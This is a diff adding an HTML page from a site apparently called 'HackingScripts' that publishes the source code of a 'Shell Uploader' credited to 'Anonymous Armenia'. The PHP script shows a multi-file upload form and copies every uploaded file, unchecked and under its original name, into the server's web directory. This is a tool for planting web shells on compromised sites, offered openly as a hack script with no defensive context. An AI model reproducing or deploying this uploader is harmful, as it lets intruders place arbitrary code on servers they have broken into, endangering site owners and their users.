@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <link rel="stylesheet" type="text/css" href="/stylesheets/stylesheet.css" media="screen" />
+    <link rel="stylesheet" type="text/css" href="/stylesheets/pygment_trac.css" media="screen" />
+    <link rel="stylesheet" type="text/css" href="/stylesheets/print.css" media="print" />
+    <link rel="stylesheet" type="text/css" href="/stylesheets/styles.css" media="print" />
+    <link rel="icon" type="image/x-icon" href="/favicon.ico">
+
+
+    <!--[if lt IE 9]>
+    <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+
+    <title> Shell Uploader source code </title>
+  </head>
+
+  <body>
+    <header>
+      <div class="inner">
+        <h1> <a href="/">HackingScripts</a> </h1>
+        <h2>Hack Scripts for everybody</h2>
+      </div>
+    </header>
+
+    <div id="content-wrapper">
+      <div class="inner clearfix">
+        <section id="main-content">
+
+          <h2>Shell Uploader source code</h2>
+<p class="meta">28 Apr 2015</p>
+
+<h3>Anonymous Armenian Shell Uploader source code</h3>
+
+<h4>By Anonymous Armenia</h4>
+
+<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="lineno"> 1</span> <span class="x">&lt;!DOCTYPE html&gt;</span>
+<span class="lineno"> 2</span> <span class="x">&lt;html&gt;</span>
+<span class="lineno"> 3</span> <span class="x">&lt;head&gt;</span>
+<span class="lineno"> 4</span> <span class="x"> &lt;title&gt;SHELL UPLOADER BY ANONYMOUS ARMENIA&lt;/title&gt;</span>
+<span class="lineno"> 5</span> <span class="x">&lt;/head&gt;</span>
+<span class="lineno"> 6</span> <span class="x">&lt;body&gt;</span>
+<span class="lineno"> 7</span> <span class="x">&lt;h1&gt;SHELL UPLOADER BY ANONYMOUS ARMENIA&lt;/h1&gt;</span>
+<span class="lineno"> 8</span> <span class="x">&lt;form method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span>
+<span class="lineno"> 9</span> <span class="x">&lt;br&gt;</span>
+<span class="lineno">10</span> <span class="x">&lt;/br&gt;</span>
+<span class="lineno">11</span> <span class="x">&lt;input name=&quot;file[]&quot; type=&quot;file&quot; multiple/&gt;</span>
+<span class="lineno">12</span> <span class="x">&lt;br&gt;</span>
+<span class="lineno">13</span> <span class="x">&lt;input type=&quot;submit&quot; value=&quot;upload&quot; name=&quot;upload&quot; /&gt;</span>
+<span class="lineno">14</span> <span class="x">&lt;/form&gt;</span>
+<span class="lineno">15</span> <span class="cp">&lt;?php</span>
+<span class="lineno">16</span> <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&quot;upload&quot;</span><span class="p">]))</span> <span class="p">{</span>
+<span class="lineno">17</span>  <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nb">count</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]);</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+<span class="lineno">18</span>      <span class="k">if</span> <span class="p">(</span><span class="nb">copy</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&quot;file&quot;</span><span class="p">][</span><span class="s2">&quot;tmp_name&quot;</span><span class="p">][</span><span class="nv">$i</span><span class="p">],</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&quot;file&quot;</span><span class="p">][</span><span class="s2">&quot;name&quot;</span><span class="p">][</span><span class="nv">$i</span><span class="p">]))</span> <span class="p">{</span>
+<span class="lineno">19</span>          <span class="k">echo</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&quot;file&quot;</span><span class="p">][</span><span class="s2">&quot;name&quot;</span><span class="p">][</span><span class="nv">$i</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&lt;br&gt;&quot;</span><span class="p">;</span>
+<span class="lineno">20</span>      <span class="p">}</span>
+<span class="lineno">21</span>  <span class="p">}</span>
+<span class="lineno">22</span> <span class="p">}</span>
+<span class="lineno">23</span> <span class="cp">?&gt;</span><span class="x"></span>
+<span class="lineno">24</span> <span class="x">&lt;/body&gt;</span>
+<span class="lineno">25</span> <span class="x">&lt;/html&gt;</span></code></pre></div>
+
+
+
+        </section>
+
+        <aside id="sidebar">
+          <a href="http://upload.hackingscripts.com" class="button">
+            <small>Upload</small>
+            a file
+          </a>
+
+
+          <a href="/scripts/" class="button">
+            <small>The entire list of</small>
+            hack scripts
+          </a>
+
+          <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+            <!-- HS1 -->
+            <ins class="adsbygoogle"
+                 style="display:inline-block;width:160px;height:600px"
+                 data-ad-client="ca-pub-7125626766070078"
+                 data-ad-slot="3438552774"></ins>
+            <script>
+            (adsbygoogle = window.adsbygoogle || []).push({});
+            </script>
+          <!--
+          <p class="repo-owner"><a href="https://github.com/jasonlong/architect-theme">architect-theme</a> is maintained by <a href="https://github.com/jasonlong">jasonlong</a>.</p>
+
+          <p class="repo-owner"><a href="https://github.com/pietromenna/jekyll-architect-theme">jekyll-architect-theme</a> is maintained by <a href="https://github.com/pietromenna">pietromenna</a>.</p>
+
+          <p>This page was generated by <a href="https://pages.github.com">GitHub Pages</a> using the Architect theme by <a href="https://twitter.com/jasonlong">Jason Long</a>.</p>
+      -->
+        </aside>
+
+      </div>
+    </div>
+
+  </body>
+</html>
